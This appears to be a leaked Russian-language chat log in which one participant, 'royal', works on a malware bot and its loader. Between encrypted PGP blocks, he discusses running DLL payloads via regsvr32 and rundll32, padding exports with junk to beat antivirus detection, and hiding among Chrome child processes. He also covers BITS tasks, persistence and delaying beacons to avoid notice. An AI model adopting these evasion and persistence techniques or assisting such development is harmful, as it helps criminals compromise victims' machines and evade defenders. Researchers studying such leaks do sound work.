[27.07.21 09:56:45] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/9FioTAcgzidsZc2u13IBJyJ6iTnHJDKOXj8Ya0o2XA1jF
jCR2Nf426ybluOc4NH5Oe7ySr3J+93/wrnYj6zqP2c4KrLEcCM5eoCsMs+TPIxaj
kt1Sj8MpaUAuQpARPIeW1VwNsfi5PD4MxshaxGNp5DwX9foQjkXC6J/FPgytsmzV
UrBBLB7pcue4e2r3MWTWkEbu/YwUce95Un3Flw877CQUZzqn3uS0YwJHIm0I1pJ4
kU3COdf8TseV8vNOV36lvOK3S3WDFpy6BqQUsrV5or2f8AqQ7zuKaLo1O9EoJn1R
86lcSyuLUoXKZFKn3F/ShItY4sr4g8PQVz59vlpnucD4TSOUd4d4/1TpK8aSjL6U
5r4EFr/29MS5MMKjV4793dYCflQ2nvAgbLNLtX8LetzPYA8vieqcKY9ftAjU+DIa
YTv+nCLq94Ei4cMJjsQDXG1N+YisChO96Bg+5kRrzvV9JnIcbuDKHvId9lAghCOm
rSi66fV3YFfmCho1a7AviR21vxLo8/tCAPxmAOezm7QixUj0BKpdY0rrfwCUu1tZ
2ifwhrBfLRgj6mM0Z8MOcrw41RYXZ60IXKvlElJ7mrxQi+oGZ6FOv0Ek9fLbrh3l
LSyKj9pCf+ycYRYrNlYWhUeIEFEjAqKTqzfI0pAOniYYykSYgLRAw99VpmSaFsDS
wHMBsTNSzWandJfnuq+zZavJYKedAuNiXiXKcn34eUpmAlC/yrTwUNn+4bZVkJeR
RgZxIIfDjY1Y5mvXI7JSdNuy8P+Llwh3XMspVzC7yu2SnDFd+CANt6ikoTNbQsWg
sW8jmKvVjbPgp5hSeCeieVKbBjYiVOARx3Tyh0TC3AbmyEnNWC/IfsQvvBVp8iaj
sahWR/LA8UGrePL+e0Y5E6M/cRlPGZp6i/RTGJETdnAQdMEcp78FhBbvJ8UrxFin
l8QjlTgCv9ZrXY+yc/2Zkxvq9Ui20KGIqFLWZo26jcYpU+8mO6rUU6RFvsqEfspy
BfaqKEWBiYLoQXIB7/U9VVggQSpL2t35EFyyP+z2zAT/jTXFqsjbiCBMyBBGoCim
OJtL99kqCQKNTdr8haaeUMWBrZ/m
=KTx/
-----END PGP MESSAGE-----
[27.07.21 09:56:58] royal:		Там где LoadLibrary использовать GCC.
[27.07.21 11:15:48] royal:		Без крипта работает верно?
[27.07.21 11:17:30] royal:		Наверное HANDLER на файл не передаётся в функцию LoadLibrary.
[27.07.21 11:17:35] royal:		Сейчас проверим.
[28.07.21 08:56:12] royal:		Получил
[28.07.21 10:52:21] royal:		Да. Любое имя может быть в крипте.
[28.07.21 10:59:02] royal:		А та что regsrv32 тем более будет работать, она экспортирует HRESULT _stdcall DllRegisterServer()
[28.07.21 11:02:39] royal:		Я проверял тримя командами regsvr32 что были в ТЗ.
[28.07.21 11:05:04] royal:		Там у меня смотрит что за команда regsvr по своему парсится, rundll32 по своему.
[28.07.21 11:07:13] royal:		OK.
[29.07.21 09:08:26] royal:		На dyncheck истёк уже лимит.
[29.07.21 09:08:43] royal:		Проверить не смогу. Вчера детектов не было.
[29.07.21 09:23:04] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/9H7TOGJA1DclbJIPTUipBuJwG193cZTGfXra8QZVOe594
SfGKY8AcJkZIM77MLcJh+6LImPVJP1bLpxfjRSeHBYBW6QCxl9FHo0SndQM9vEyb
xEHygR+3d/u1Qf8xyS97zig1UPeZ6I/Sc0E2TXhZi14dkPfM98gmsov1xyYH/qFo
yt+/mYC0nhQW8Jlp4OuY0M/J/Npc11sJRyx9qVIzxo0MSi7Vk5ngagGd6ZjKVrgM
c6tB1JA66W8JIBv1ElTUsultU8AmdufCCz7zg7Hp+G1T2gtnIz8403qvUOPb+7Ad
vpk9zGBDS94CH9RdSyTTn/3yCPP+zfhulpSlQmjm13YvKyX2wuhNczUWA0sVmwbp
pUzPIqqxVqPRFJYpPIbgA+1IBQEVnh104b1t9M7u9N5Cd16VPw+YpC7Z3wZlxBCH
2id3gGdROY8oTUVNe/M0fX5DHMpacQyATBKyzGBjQGzW4lahA+EdY6Ji0J1XS93+
GUUU1zyHliJP5l8/dGRkYYEPcSGeX69aYCSKFsAGbqXd9fE3fwJ1iWVNWwWI+bv1
9+H9lYZmzOExOowLHHGuCAiItJSsiVhhERTPzaU2YRTWVDj2O763d+N7ubbfBeAY
SyMw39k7TuncL7YwsvgdzFPCE9DnUVoHnu8S0gtKyDPMcfHFkg47HIK36FsRsVLS
wDQB5LVNfeDaa3OaB2Xw6jqrSV7gJhrAvK6TlxXVC4R6dw6xCAZB33itz5cdeO+2
Ot6I4zVA06W3H1Smt+/63EgM75uCuN2AmdPvvOxP/rlfHB7nIvdYmANzPJlf4TA/
VizX/dg9T93+bue54hFFkkcKTiRQ+g0+QVrGCVmoCgtwNx8xD9JsE705pUtjno1z
0Zj6791LzgE0WThH9la8BxLSdXPl8bLv3vqpTmDOmaeZ8onrhzNTOWZ9CUeptENe
AH3VuFoVl6LHhwxN0TlyyxqgXlESs2aP4A010F3XxicX7Fm7x94+K5KzHobTifrD
pb/X8a+8
=Rt6V
-----END PGP MESSAGE-----
[29.07.21 09:26:47] royal:		С MSVC, на втором месте GCC.
[29.07.21 09:27:01] royal:		Clang не проверял на чистоту.
[30.07.21 09:23:43] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//YQ9LvpOgtEvvkYkY+dDe+Fvm9O1oipiO57Xm4t5DVgpH
INHGgz/768D3W7hFvVRfFPR1WiLQzg+0u1JCfkve5/CMr5p1oPooQ5HJfX6GFE+a
EWrzaky3ASBWrBMma3krOOk7xmktX5VY5TwYCBAGgYzFLNpfKhtsce1WIt1mh+2Y
t9/5ZSClbBjiJRbi3rSdNG+6IR6dZuwFPGmZyGyXh4ymK5rRbRzknTyi4DKyz3cl
mUNTHe0Haady1NYX2jw2gk09hFIQvziRZs9qa1Ykiac/J2gQMpLSpt9COi/3PzIl
N5ATRTBtYkY67mg82vhDKn/iMe0yV6gFWzPGd62fwYjfXnUiE19vadckR7lknK2K
32A686Bl2hAFYDvD7h3aB9hie8FE3WhngZT9k4p7GVRmdcbZKY7BBgcPqvIoRqg+
MoK46zxm6t+uBhROka+L9+5vE8H8OubuBmUEfBvIaNW94c4e7xbCm0OUEBEi1g5j
Ix4X/E73iY/QecOXIdf1zQo8AZt5y4YZz50PXxi+3esI9jtrC127aXtXtV83mxdS
SoY5UvCoxR+2dN4nRspzLCOZSV1w0nqTAscQeD1Zt6h381f2ASlbE45P7PpslyNB
Py3DnzgiLHmtrvQ29BNKYyunU359GFhSJ5+8Kx4LAlTsr3r6LSxg5qV0uwtrr/vS
wDUB2tCq6v8R75nrdrNFyY+KfK/DlBfpSSPCzNxjb93udsZ+wLQd4cn8efe8+Kk/
osATa7Rf+F0SlyYmZwLBpHLUF7+EHpJnPx2LLH6sa0/dUBqznNdc5xc4kmCqC2kC
8PEyMDfnSrE0zX8Y9GyzShXCC49YHwWIp0QLxGA/aXFO/fAA0wxmvQwUh9701jtT
m3JeV2YswaH/On0NdgndQdWkEQZ49qhNrkAXX54AE0VyFalDtR54n1QyzSXZe/JA
jajTK6fciik+Qws8DplPCd8r2NxZp+Y4LeRbzaUUE7iBdVt26OOz+R9Sj9IYnrV+
37QcchYU4Q==
=Zro5
-----END PGP MESSAGE-----
[30.07.21 09:23:47] royal:		Использовать GCC.
[30.07.21 10:48:30] royal:		Получил.
[30.07.21 10:50:54] royal:		А как же скорость резолва базар адресов?
[30.07.21 11:04:38] royal:		Сегодня ещё БК надо будет собирать какие?
[30.07.21 11:07:37] royal:		На 2 часа успею отойти?
[30.07.21 11:09:03] royal:		OK.
[02.08.21 08:33:30] royal:		Получил.
[02.08.21 10:39:56] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAkdGOBKIjM9wFggrLKhUd6HB3ZQ7ZU9MtQ0YiJ0Spg8uT
cy12DW+OOgNy/IgOaImkkSRcpbZkGO3THqWPS/BQLFCCdSM0x7BXRKYlf/cVkF+C
LvuVlufvnkI+CXK7cmSe5K6jasT+L+qGNhcL9yzlap8mF8UuAOtshrO+pdr5G53x
nhMErgFMSzv+TaGPcImeEpcb5Vso1mop9m7mx3PU7ci7Ei0f5U1lr6UAkskw9OIW
OyoE/K0jvoUKLSPCm6+bX1t6YlNOFqanYI7sYHRzr5hhcAo2ykZvle5wzWrLnfYg
zXEqcJLBouCvd1I4HeeLgST3fG3IGwCCFd0Pz+IBF5OytX0UAgoYoUc/NQk+4RCD
ZAslTO0pLetuyiVCr9caK6qdikZ32x1qHkoFAfDbqNs21NtYaeADr9JYCn7jwoF1
zVnPLbGiRy9TzxfvrJXLMmhbsMUCuEtcxOJXOArtVY3JvTkgTYDV4RPSnMd48iJ+
dVL7aVC38ILTs8HjOrff6CrKuFVeppnH29J6qbV6fHvaPSWChtatSrQrItpuy2nm
E3mAVT4kzcG/3qfbJUWrT0xMrnDvf8mJQQc77YTCpZP8V9kEAKwEu2l2S+jqz1jA
fL9gfhZoo+IwAJcJSFv1U/fJWVMgwec8DZqABpCgvwlWC+2OU9TZJFJ3VyQ0WDLS
wD0BpEzAfXGwmq4BHatSZgkqHKDSwog1A14iNfOtGRxSamngMdAQbMMPHUb4W2tI
aUsJh1FXhGlQkxFf8yyTMojrKfcWkGVYZdifcqHbWKep/3mSb0cPTKGr1GeoJAI6
de8fWqNQYcbyrJoEnIXFYuInE0OtPsSp9z9XgwOLxVEeCpxouLPyFj18dAf+lgJL
ynQAabSJlP/fCC1uQyzRqShlybA2AgQU4kNu1hx/G0AzKQh/qGKmdQIMLez/yq80
xeFgORo6wNwpbu3Hm2oUPBgvM31/LvmJBUx7ve7dwf6pmdLxBTjUP8TsYQzq+GCq
PSnh8x53/Vz4x8eMk8Aw
=sEcG
-----END PGP MESSAGE-----
[02.08.21 10:40:00] royal:		Использовать GCC
[02.08.21 10:59:03] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/8Dv6NpUErmWpkuLUhb2B27FTBTFJU3vNpanCBIx/FCf8w
QW2095DAnQOoPFBAlijsPPaVfpgcJsu692zuUG058wYZgNAA/woqU0Hb1S8S3YoA
DgS3js5os0PSwU6fNAxbrYb6Jwh2oVFLzAHSCkkUDdJm1v99dhtcEPpmwqzTk7dw
AjWmgMmMUKIbZBRRK52CF+eTYquiFV+tKglLj3vxXT+WoptBzJyFqJlLkU5iQZQu
ECddMGTMOV5A/L11nSljH5UVuOq5vWnZeLr903FfIhxhCSKenJOfLzvuiiE4hXbR
GWv3vq6czBxCvRlt6QIiUSOhOz1UVOZbUbeu0GaQcpLO1CC1DfQ8fqIowJ3H6k51
uNeUAEWbq7QM6ZUdMRLtf2PNTDgQSOLOtI6YlWxsfhnEzTl62D82phziOWfivnHm
DcXndsAb+LHV+73ZglpQdC3Hs+h9mFLRUNXJa+3A0KVtVjkKX1Y1ecDq/lwRhYIC
KU0v/Z20IQtfVoZJl1GA2Z3kQZvZrw1kQWOLFZuSIGnlYZKsW6i391aBFJaIhdA1
+GkGK7aryH/0fkIU2FKPKP3dm+AKeNLc+GZvmoUtnEA2L8L/4nKxSG+/qMtNPQNM
V2y0nhF+hQe+0mvV3ZrFYgYgcyAtE4WE7FB23r2SswuRlHuh1ogT5aSBEqyOJrDS
wEABhbYzdLiu02I1v76ISAJ0Yo10JrSHZNBb046Ch9XyWVvctrHrh9f3M/rImZOs
cko631Y35o3G/MjqYx3ULvYKUJgxprPfh0+ikgg9p2HpSPGNjveUyfj8MEE2tcNG
zQDHg568aOJW3NLFYW/EJVQ5s3YWY/SugKmoXs0bnTGq/xrKI9OrPg7TJpQEac3v
0hvhm+yfT9UAQJJX/vM8UCZItTHIjon611moyXzB9CshCDt/XoquPqtcr6X27UOS
dMPBLg+rY7pZoPJqyj7VuPxXNsXTqQ5O+GT3L4bwki3a41vdE7YGKi9re1C1sRTS
bu4MIZa2E7ZHk5mw8V1tUNyy
=5OHm
-----END PGP MESSAGE-----
[02.08.21 10:59:07] royal:		Использовать GCC
[02.08.21 13:31:56] royal:		Где это?
[02.08.21 13:32:12] royal:		Может запускали без загрузчика.
[02.08.21 13:32:43] royal:		Исследователи вытащили бот и запустили.
[02.08.21 13:33:34] royal:		Может версия не та ещё где я сделал path.
[02.08.21 13:34:51] royal:		Странно что нету.
[02.08.21 14:24:15] royal:		Через переменную окружения.
[02.08.21 14:41:52] royal:		бат команду надо завершать \r\n типа нажал enter если без сохранения на диск
[02.08.21 14:42:29] royal:		Program Files (x86)
[02.08.21 14:42:36] royal:		Битность не совпадает.
[02.08.21 14:42:45] royal:		Бот 64 битный.
[02.08.21 14:44:36] royal:		И ещё должен быть запущен хром например, чтобы под его один из дочерних процессов замаскироваться.
[02.08.21 14:45:24] royal:		Я сделал изменения по поводу path, на следующих сборках посмотрим.
[02.08.21 14:46:39] royal:		Теоретически может.
[02.08.21 14:47:03] royal:		Хром ещё бывает 32 битный?
[02.08.21 14:49:07] royal:		Там у меня было до изменений сегоднешниъ так, если по какой либо причине не удавалось прочитать блок переменных окружения одного из дочерних процессов хрома например то и не устанавливалась переменная окружения с именем файла загрузчика.
[02.08.21 14:50:15] royal:		Теперь всегда устанавливается для текущего процесса перед запуском бота, если не прочитался чужой блок, свой унаследуется в любом случае, а там уже переменная установлена.
[02.08.21 14:50:58] royal:		По поводу однострочных команд, просто надо в поле где её вводишь нажать enter
[02.08.21 14:51:16] royal:		Тогда придёт с переводом на конце
[02.08.21 14:51:26] royal:		Не обязательно самому писать \r\n
[02.08.21 14:51:39] royal:		Могу.
[02.08.21 14:55:43] royal:		Нет.
[02.08.21 14:56:10] royal:		У меня всё так как будто работаешь в терминале.
[02.08.21 15:01:37] royal:		Не завершалось само потому что параметр передаёшь чтобы не закрывать после выполнения команды?
[02.08.21 15:03:23] royal:		Или пайп со своей стороны не закрываешь?
[02.08.21 15:06:12] royal:		Да.
[02.08.21 15:06:40] royal:		WriteFile не завершиться пока с того конца всё не прочитали.
[02.08.21 15:06:48] royal:		Можно закрывать спокойно.
[02.08.21 15:08:41] royal:		Тоже без параметров делаю.
[03.08.21 07:53:37] royal:		Если нагрузка кривая крашиться процесс её это никак на бота не влияет, крашиться другой процесс же.
[03.08.21 07:54:25] royal:		Сколько раз было когда в 32 битный процесс грузили 64 битную нагрузку и ничего не было с ботом.
[03.08.21 07:56:55] royal:		Там более вероятно что антивирус убил.
[03.08.21 07:59:13] royal:		43200
[03.08.21 07:59:53] royal:		Это время таймаута 720 минут.
[03.08.21 08:00:36] royal:		12 часов следит за процессом, другие команды не выполняет кроме 14
[03.08.21 08:01:24] royal:		Може таам вывод накапливается огромный, и память кончается.
[03.08.21 08:01:56] royal:		Да.
[03.08.21 08:02:02] royal:		В системе
[03.08.21 08:02:23] royal:		Он обрезает когда посылает.
[03.08.21 08:02:34] royal:		Так он всё записывает.
[03.08.21 08:03:47] royal:		Там вывода нету.
[03.08.21 08:03:54] royal:		Значит не это.
[03.08.21 08:20:20] royal:		Вижу.
[03.08.21 08:31:10] royal:		Я посмотрел, по поводу телеметрии, может что у следующей команды таймаут пришёл большой тоже и он уснул на него, до нового запроса.
[03.08.21 08:36:24] royal:		Он смотрит сколько работает перед запросом команды.
[03.08.21 08:36:50] royal:		Если таймут пришёл от команды то его ждёт.
[03.08.21 08:37:41] royal:		Чтобы не палиться лишний раз.
[03.08.21 08:41:41] royal:		uptime - lastUptime >= 3600000
[03.08.21 08:41:57] royal:		Больше часа прошло с предыдущей отправки.
[03.08.21 08:42:45] royal:		Там такое есть. Больше 12 часов прошло с предыдущей отправки.
[03.08.21 08:43:08] royal:		Отправил uptime 50000 секунд
[03.08.21 08:52:46] royal:		Сам бот создаёт задачу BITS.
[03.08.21 08:52:53] royal:		Так же как загрузчик.
[03.08.21 10:00:37] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//WuzCHku3xBhpC3Hznv/UkeY4ZdsFr2GarzqCXkl5Tpyt
AmPZmdBw5atS70QK/X7MMp215F5Gb1q5f9Roc8iTORYOBLVblLXFfTfUHgmnbKcp
SagbK3HngCONuWol/dDbDhVDTmof5K2YsUMejB4ftNroDr0SGQxNmQQfcBcG60JC
Ll1wbqaOycBDYYcFnE2Y5qMUwxZHmQuaF6fGwwjDok2ZZQRUEj8NMmsmFZKZazEq
OpzOHvyeaUsCs8oFSczQGakEQhgpqTpUvgbXWww720WSreoHhD6ILbVXaIUlSj3Y
/6vQk0Aqt80KYibs9GkXKow2YihNZSV5FYjRnjOx2FTlRCp8PqpJcsbkNn7EF1IM
FqEG+eNAjIOFb0YJm3BSeflODqVGUcgSQ8p5fsQdwXpchQm2VAbAW7/v0WTatbq1
uFaLT/BuWBpcgkRDB7h9sc4GI7oMMQSMwi8yxP/VwNQLNEpcVRwWy+4Aqw86Ut06
HhZdV90gM2ycJKAUux/M8dcSNNMKdjw5ihmDIVAMQaXvkFqNkB1deorc1x+xRi/X
y9P+z3qe1fKueFps2ZnHpv9zUSJj4ySGWvY/MIatH2zYXZf4oE19hlsh7HYUQxp0
UxvQWSnvHcoFgH+AgYnH+j/yZyGqFdQOLJjgvjSmCWLZN9Z82m16UJAD0idSCkHS
wD4BCmyOBtjuDIt8phjbNrHIgcfF2EarsIel16DdgOY+HWAQ4v91oqdxxKTLSO4C
tIB9MonG3w4Hhil9dM+KHUn1pZ4/zVPEAk6crsfm3OpRnKx/Z4iUhK+e36Y1fqCd
BhVWNlyYZnelcX1Y1fqcNXSnQ+DKBLNy7p8knmQ4TagbLycS5GO/j587r+SSBoEz
O8jlzj9tNVZJ54vgfFbDGyVosV/6eWgsMVxSkwFatOGrcx6WbT6RBpa3wYxF1Egq
A2Vw346qIQLNK0NIchqnOqGdNRbHFnIHAyfKX8PG8xB4JsdWkewQgMwXovIMlpfB
JRAtBdQtjf+CULFsWAkasQ==
=lOFF
-----END PGP MESSAGE-----
[03.08.21 10:00:43] royal:		Использовать GCC
[03.08.21 10:09:47] royal:		Разделяются если надо.
[03.08.21 10:09:57] royal:		Несколько строк закомментировать.
[03.08.21 10:11:37] royal:		Наоборот.
[03.08.21 10:11:53] royal:		Когда только regsvr сразу куча детектов.
[03.08.21 10:12:04] royal:		А когда много мусора прокатывает.
[03.08.21 10:13:30] royal:		Я делаю так когда только надо StartW, я из экспорта убираю всё остальное.
[03.08.21 10:13:59] royal:		А когда regsvr надо добавлять мусора в экспорт от детектов.
[03.08.21 10:14:44] royal:		Я проверяю, пока не даёт.
[03.08.21 10:14:55] royal:		Будет давать, разбавлю мусором.
[03.08.21 10:31:44] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAjoA9ClHhhqrt+n0Tqvv6OZI53EqzZHTptXZQQB48/FRi
sgxDAiT8Rzv9No29YGqv8uSPGBn4OOsMjNCL3OeGyQ/DKCbU8JIXZztnLhEnGUjG
4Qnm6g8TpBHI9mlqwHLjRqfvxp3rao1gG+hic9ztsLOWX81FVzB+RjR6H4sWPEz3
WrwYdl0cIlXiTUX1bXa4L4LDkgPZ7BrWn5HwbJQdIRSf6lh4Amjf1ZvvZ+7vqhwB
/wubWWscpY427UGkUMLXeivgdgZKS6R3fhONs7+SU1I7u1QPgrrik8/yKWDMToaM
O1wi3q9pZ3Q7FFuxid83Beu6jCTcPhy8++VY+hyJUfmTLw9GF1/eoxrCP4CboR2R
WQqjyXpZfqRmKD8OGQxpbIgfBImMynlE44pV5Wu2cJzq69zPlSCG4V1NBiv/hf88
Ly+DIAOamcZ+YCd3U5eMeR82a7ng6PWm/ZvOo8wPcOSLZUhcF8S9DwuSpA1jvoy4
H4jT3MOYEA0B3y9bIDK0KowhJPJHMhETQioPX20yCGkMEv91zSzlSqQNaN8rbUzU
a7oBXy5z/qHbG3Nm5uuRvgbZI2EziP4VrJ6Rqeg3y0arHVQL3rum2B9DYAsbj81j
bsZpYYigH3MMUmM24vx85plB36wDjv4sWTcHyfQSEX98tx7FaAw9hh6E+zFs2irS
wD4BDqo+bCMbtjY+5qpeZJkkMyYEYGfhyXTU+KCy1vQKa6nWFdXlFMJ3shkZEBse
b5lDnxdwH98N1qaYXP5uEXZEv8GZg6IpdXfK3x+GhEobEjtXPZuIFwG4isubQOvs
Qyrh6qf53O4yDEAL1JV9O3Ih4GqEOR5J8SiqGydNfhYwGZisWDKm720Tx0U16pnm
W/jtiFWLwWEsAqo+vJlgdK4/E0juFH5kwm85Kh5lKkpiD8w300Mf65SO4CBAVmSb
TL2WKFuqm2pUY0cINrn09UU9G0IGKW+XYAb6bciWI7mrxaoYls0/9yFRae0ye2OQ
nBs4LZQPG/RJ23SoMLgjxQ==
=GAiT
-----END PGP MESSAGE-----
[03.08.21 10:31:50] royal:		Использовать GCC
[03.08.21 11:09:37] royal:		Протетсирую.
[03.08.21 11:10:07] royal:		Как там отдаётся файл?
[03.08.21 11:10:11] royal:		В теле ответа?
[03.08.21 11:38:39] royal:		Что надо чтобы было сделано? Загружен файл, удалён старый, запущен новый.
[03.08.21 11:58:25] royal:		По поводу команды 10 4
[03.08.21 11:58:50] royal:		Может её расширить, чтобы в ней указывалось ещё как запускать загрузчик?
[03.08.21 11:59:09] royal:		Он е может запускать ся rundll, regsvr ещё как то.
[03.08.21 12:01:01] royal:		Пока так, если dll то rundll32, если exe то просто.
[03.08.21 12:01:33] royal:		Если надо будет regsvr не прокатит.
[03.08.21 12:01:49] royal:		Надо ещё параметр в команде
[03.08.21 12:02:11] royal:		Пока можно жёстко указать.
[03.08.21 12:02:22] royal:		На будущее надо ещё параметров ввести.
[03.08.21 12:03:01] royal:		Один можно, который тупо указывает всё командную строку запуска.
[03.08.21 12:03:32] royal:		Имя файла загрузчика заменяется макросом, у нас это предусмотрено.
[03.08.21 12:03:56] royal:		А если заменить надо другим?
[03.08.21 12:04:09] royal:		Так можно любым заменить.
[03.08.21 12:04:30] royal:		Да.
[03.08.21 13:13:08] royal:		Ещё вопрос по поводу 10 4.
[03.08.21 13:13:17] royal:		Там имя файла в команде есть.
[03.08.21 13:13:28] royal:		Это же не стандартное поведение?
[03.08.21 13:14:16] royal:		В будущем могут убрать?
[03.08.21 13:22:09] royal:		Значит тип файла буду NT заголовкам определять.
[03.08.21 15:19:37] royal:		По поводу path в systeminfo. Смотрю что в группе 19 нету нигде, а в группе 20 есть везде это поле.
[03.08.21 15:20:04] royal:		Может быть что в админке такого что она игнорирует это поле в группе 19?
[03.08.21 15:24:20] royal:		Понятно будет по команде anchro, если она отрабатывает, значит бот знает о своём загрузчике через переменную окружения. И при этом в информации о системе нету path.
[03.08.21 15:29:47] royal:		Сегоднешние.
[03.08.21 15:29:57] royal:		Ни в одном боте path не нашёл.
[03.08.21 15:30:09] royal:		Это только группа 19
[03.08.21 15:30:44] royal:		Если anchor будет работать значит это админка что то path не парсит или игнорирует как то.
[03.08.21 15:31:00] royal:		В группе 20 везде есть path
[03.08.21 15:31:10] royal:		В 19 нигде нету.
[03.08.21 15:33:07] royal:		Как не парсит смотри 1459e18684ce1f4859534c64f175e72e
[03.08.21 15:33:29] royal:		Есть path с загрузчиком.
[03.08.21 15:33:53] royal:		Может не парсит именно в группе 19
[03.08.21 15:37:25] royal:		Перевод строки не забудь
[03.08.21 15:37:56] royal:		Путь должен быть в переменной PARENT
[03.08.21 15:41:31] royal:		При любом.
[03.08.21 15:41:42] royal:		Где запустили такая и рабочая папка.
[03.08.21 15:42:35] royal:		Скорей всего svchost
[03.08.21 15:43:03] royal:		Был бы браузер его папку рабочую бы установил, а его тоже могут запускать откуда угоднр
[03.08.21 15:44:28] royal:		Да.
[03.08.21 15:44:36] royal:		Они унаследуют
[03.08.21 15:45:25] royal:		Я думаю нет. Этих переменных окружения программы устанавливают кучу.
[03.08.21 15:48:08] royal:		Самое интересное что VARS=19 есть
[03.08.21 15:48:20] royal:		А она утсанавливается там же где и PARENT
[03.08.21 15:49:27] royal:		Или где то снимается эта переменная.
[03.08.21 15:51:41] royal:		Наследуется. Или добаляется к блоку переменных дочернего процесса одного из браузеров.
[04.08.21 07:48:54] royal:		10 4 работает.
[04.08.21 08:22:20] royal:		Я на 90 процентов уверен что это из-за того что парсится не верно командная строка и имя файла загрузчика не получается, как то запускают хитро так что я не проверял.
[04.08.21 08:23:22] royal:		Не закрепиться если не знает зашоузчика.
[04.08.21 08:23:28] royal:		Закреплять нечего.
[04.08.21 08:29:45] royal:		Скачает запустит загрузчик, попытается удалить старый, не удалит.
[04.08.21 08:29:51] royal:		Будет 2 загрузчика
[04.08.21 08:31:42] royal:		Можно определить из DllMain через hInstDll
[04.08.21 08:36:07] royal:		Спроси как они запускают
[04.08.21 08:36:15] royal:		Я проверю как парсится.
[04.08.21 08:37:26] royal:		Я проверял regsvr32.exe /s file.dll
[04.08.21 08:37:33] royal:		regsvr32.exe file.dll
[04.08.21 08:37:41] royal:		rundll32.exe file.dll,StartW
[04.08.21 08:37:48] royal:		Как ещё можно?
[04.08.21 08:39:05] royal:		Без расширения не проверял.
[04.08.21 08:54:04] royal:		Да.
[04.08.21 08:54:23] royal:		Это я сделал пока с path не разберусь.
[04.08.21 08:55:09] royal:		Так штатно, если не знает файл старого загрузчика, то не будет ничего делать.
[04.08.21 09:02:50] royal:		Влияет если загрузчик не generic
[04.08.21 09:03:05] royal:		Я тут придумал, у каждого файла есть checksum
[04.08.21 09:03:37] royal:		Надо перебрать модули загруженные и тот у кого будет checksum мой будет нужным файлом.
[04.08.21 09:04:19] royal:		Буду заполнять.
[04.08.21 09:04:47] royal:		Точно. Не прокатит.
[04.08.21 09:06:48] royal:		А почему крипт не передаёт hInstDll на себя в DllMain?
[04.08.21 09:07:11] royal:		Это бы сняло все проблемы.
[04.08.21 09:09:33] royal:		Там юникод у меня командная строка.
[04.08.21 09:09:40] royal:		Любые могут быть.
[04.08.21 09:10:39] royal:		Окружение юникод у процесса.
[04.08.21 09:11:04] royal:		Если прочитать PEB там всегда юникод
[04.08.21 09:12:09] royal:		Плю с ботах там locale en-Us я вижу, а path нету всё равно
[04.08.21 09:14:44] royal:		Это есть.
[04.08.21 09:15:29] royal:		Так же работает. Они все вызывают DllMain сначала, а потом уже экспортную функцию.
[04.08.21 09:17:29] royal:		Я проверял разные там пути в команде, никогда имя не остаётся пустым.
[04.08.21 09:17:42] royal:		Что то там в команде не обычное запуска у них.
[04.08.21 09:18:21] royal:		Даже если левак написать всё равно пустым не будет имя файла
[04.08.21 09:21:47] royal:		Если левак, то файл копи не создастся, CreateFile не отработает с левым именем.
[04.08.21 09:28:24] royal:		Как? В DllMain имя файла брать как в LoadLibrary, а всё остальное как regsvr32?
[04.08.21 09:32:27] royal:		Можно чтобы в криптах все передавали там гже lpReserved HANDLE на себя если запуск rundll32 и подобные.
[04.08.21 10:18:48] royal:		Ещё спроси там по поводу path, модифицируют ли как переменные окружения они.
[04.08.21 10:20:39] royal:		Никак. Я же самым последним её устанавливаю. Тогда жду командной строки запуска.
[04.08.21 10:21:26] royal:		Да.
[04.08.21 10:22:51] royal:		Я её устанавливаю на свою.
[04.08.21 10:23:23] royal:		Чтобы было как у дочернего браузера.
[04.08.21 10:23:31] royal:		Процесса.
[04.08.21 10:31:26] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAsdLqv+DscD/rSFYkOQ8rH8tkqmKDs7SvJiLJs1wJiPKF
Gzg/IQAWoQBGi2YPWUeErAn0NV8RNTJAM700Z8rs0y4T4f8jNzq0VFpSGSkscE8E
4pjxbI06jauffvvSRVMXDIgNk4LuoIY7/wIBaVQ2kVCXTkyyWTaPzIKnufL8547B
3sI9udpgJbpw/9dCMIqQx0v45v7tKTexYJlqD1cngcB6+fJbWst59icDkpu2xslC
OukW0AbWnO9Dd4y457jDdIAD/f5sWT2aX7N6h5GmSSglwvFeQwcKCOJF7VL0owLz
FsEvZGKBjbdN4RKjK8ENxAiSP4tnLIQy+FX7GnG8Bug2bhOS1ng91gYM3JgBUv3Q
tT8N4Yo8YyUIzZXVNvabNhDZJZr3N2ZS8f6LqFr9ZpX3gOTJ5HozP13LsecLAXQ9
RO55wwb4VKTqZBJecG5Vs/GOSQ1Z45H9uEcq40upCWCwdVXWPqhAj9wp7m+S4MSV
IwJctz5ehkZx1d0P1s8iSDe+490HPgLpd9umkH6llJar7YlgxZbnBMCD8KG2tyBZ
Flb0nYG14tOMiCYNWPzRknGYRcjk6lMA1StNOb1GhRCILJTTRrzzBqHoCjKrmZLS
T2/WR0oHkBG8b9HiKJORKozEUtLsqomURoD4598mjswbwkV48tcndrsxUYM0GH/S
wD0B7HeX7Yfgn4fzJnz52RI4+0Hol/+20KJv8Ekpw1hSNYEmvkQcaeqDbTTCpWJI
MT6khdyzESqQPmoRUj9dw5T0sPH/GzNKDh6SfJDFpcflCBS/RPghTmRd2Pi1Nc+D
I71QjxQoLVgzmXsibHb7hC/D+11TvNkZxgj/knSMQNivuRjzbQpy3t6MABs4LFkR
IcNDPUY00VTMl65p4nTSK6luW8lkO7oI6LXORfXIlP7B2h8rhwlV3Ed9nIK/LZAc
mCPhigRk9BLo1KOIFj42qqQEoL9iw2ku1vnQn7lh7rpJIsD2wpFivtJha2JBxSqW
CmLYwEq7chHLbqMJvFQB
=CYOd
-----END PGP MESSAGE-----
[04.08.21 10:31:32] royal:		Использовать GCC.
[04.08.21 12:10:46] royal:		Покажы бот.
[04.08.21 12:11:28] royal:		Который работает и path есть в нём.
[04.08.21 12:12:13] royal:		А в документ запихнут его и не будет path, я так думаю.
[04.08.21 12:16:30] royal:		Группа 20 и так работала по старому, и g15 тоже.
